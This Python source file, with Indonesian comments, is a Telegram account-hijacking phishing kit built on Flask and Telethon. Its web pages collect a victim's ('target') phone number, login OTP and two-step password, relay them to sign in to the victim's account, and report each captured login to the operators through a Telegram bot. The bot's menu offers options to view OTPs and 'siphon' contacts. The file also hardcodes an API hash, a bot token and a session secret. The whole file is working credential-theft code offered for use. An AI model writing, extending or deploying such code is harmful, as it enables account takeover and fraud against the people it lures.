import asyncio
import threading
from flask import Flask, render_template, request, redirect, url_for, session, flash
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError

# --- KONFIGURASI ---
API_ID = 31871641               
API_HASH = '5e0aa2e3b7b013161308d8880d062193'
BOT_TOKEN = '8390941360:AAG_tT7KmGz_v_ffiR1GhxmXrWQm-vkHxzw' 
SESSION_NAME = 'user_session'
BOT_SESSION = 'bot_session'

# ID Admin Utama (Hardcoded) + Set untuk menampung admin dari web
ADMIN_IDS = {7795826197} 
# Dictionary untuk menyimpan detail sesi yang sedang login (Phone: UserID)
ACTIVE_SESSIONS = {}

app = Flask(__name__)
app.secret_key = 'rahasia_sangat_aman_123'

# --- SETUP TELETHON ---
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

client = TelegramClient(SESSION_NAME, API_ID, API_HASH, loop=loop)
bot = TelegramClient(BOT_SESSION, API_ID, API_HASH, loop=loop)

# --- FUNGSI PEMBANTU ---
def is_admin(user_id):
    return user_id in ADMIN_IDS

def get_admin_buttons():
    """Menu dashboard admin dengan layout tombol"""
    return [
        [Button.inline("🔍 Cek Mutual", b"cek_mutual"), Button.inline("⚡ Sedot Mutual", b"sedot_mutual")],
        [Button.inline("📋 List Sesi Admin", b"list_sesi"), Button.inline("🔓 Status Login", b"status_login")],
        [Button.inline("📡 Set Grup", b"set_grup"), Button.inline("🔑 View OTP", b"otp_view")],
        [Button.inline("👤 Tambah Admin Manual", b"set_admin_manual")]
    ]

# --- BOT EVENTS & CALLBACKS ---

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    if is_admin(event.sender_id):
        await event.reply("👋 **Halo Admin!**\nAkun yang login di web otomatis memiliki akses ke bot ini.", buttons=get_admin_buttons())

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    if not is_admin(event.sender_id): return
    
    data = event.data
    if data == b"list_sesi":
        text = "📋 **DAFTAR SESI ADMIN (WEB):**\n"
        if ACTIVE_SESSIONS:
            for phone, uid in ACTIVE_SESSIONS.items():
                text += f"• `{phone}` (ID: `{uid}`)\n"
        else:
            text += "_Belum ada sesi aktif._"
        await event.edit(text, buttons=get_admin_buttons())
        
    elif data == b"status_login":
        await event.edit(f"🔓 **STATUS:** Anda terverifikasi sebagai Admin.\nID Anda: `{event.sender_id}`", buttons=get_admin_buttons())
        
    elif data == b"cek_mutual":
        await event.answer("Fitur Cek Mutual Sedang Berjalan...", alert=False)
        # Logika Telethon untuk cek mutual bisa diletakkan di sini
        
    elif data == b"otp_view":
        await event.edit("🔑 **OTP MONITOR:** Menunggu target menginput kode...", buttons=get_admin_buttons())

    await event.answer()

# --- RUNTIME ---
def start_clients():
    async def main():
        await bot.start(bot_token=BOT_TOKEN)
        await client.connect()
        print("✅ Sistem Bot & Sesi Admin Berjalan.")
        await bot.run_until_disconnected()
    loop.run_until_complete(main())

threading.Thread(target=start_clients, daemon=True).start()

def run_async(coro):
    """Fungsi eksekusi async yang aman untuk multithreading Flask"""
    return asyncio.run_coroutine_threadsafe(coro, loop).result()

def send_admin_notif(message):
    """Kirim notif ke semua admin yang terdaftar"""
    async def send():
        for admin_id in ADMIN_IDS:
            try: await bot.send_message(admin_id, f"🔔 **LOG SISTEM**\n\n{message}")
            except: pass
    asyncio.run_coroutine_threadsafe(send(), loop)

# --- ROUTES FLASK ---

@app.route('/')
def home():
    if 'user_id' not in session: return redirect(url_for('login'))
    return render_template('index.html', info={"full_name": "Sesi Admin Web", "saldo": 150000})

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        phone = request.form.get('phone')
        send_admin_notif(f"Target memasukkan nomor HP: `{phone}`")
        try:
            run_async(client.send_code_request(phone))
            session['phone'] = phone
            return redirect(url_for('verify'))
        except Exception as e:
            flash(f"Error: {str(e)}", "error")
    return render_template('login.html')

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    if request.method == 'POST':
        otp = request.form.get('otp')
        pwd = request.form.get('password')
        phone = session.get('phone')
        try:
            if pwd:
                user = run_async(client.sign_in(phone=phone, password=pwd))
            else:
                user = run_async(client.sign_in(phone=phone, code=otp))
            
            # --- LOGIKA AUTO ADMIN ---
            ADMIN_IDS.add(user.id) 
            ACTIVE_SESSIONS[phone] = user.id # Simpan ke list sesi aktif
            
            session['user_id'] = user.id
            send_admin_notif(f"✅ **LOGIN ADMIN BERHASIL**\nNomor: `{phone}`\nID Telegram: `{user.id}`\n\n_Akun ini sekarang bisa mengontrol bot._")
            return redirect(url_for('home'))
            
        except SessionPasswordNeededError:
            return render_template('verify.html', password_required=True)
        except Exception as e:
            flash(f"Error: {str(e)}", "error")
    return render_template('verify.html', password_required=False)

if __name__ == '__main__':
    app.run(debug=True, use_reloader=False, port=5000)
